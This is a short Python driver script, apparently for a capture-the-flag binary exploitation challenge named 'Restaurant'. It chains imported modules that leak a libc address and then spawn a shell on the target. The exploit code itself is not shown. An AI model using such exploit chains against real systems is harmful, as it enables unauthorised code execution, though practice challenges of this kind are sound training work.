from core.target import Target
from custom.restaurant import RestaurantPwn
from modules.get_libc_address import GetLibcAddress
from modules.exec_shell import ExecShell

if __name__ == '__main__':
    t = Target(pwn_target=RestaurantPwn)
    if GetLibcAddress.execute(t):
        ExecShell.execute(t)


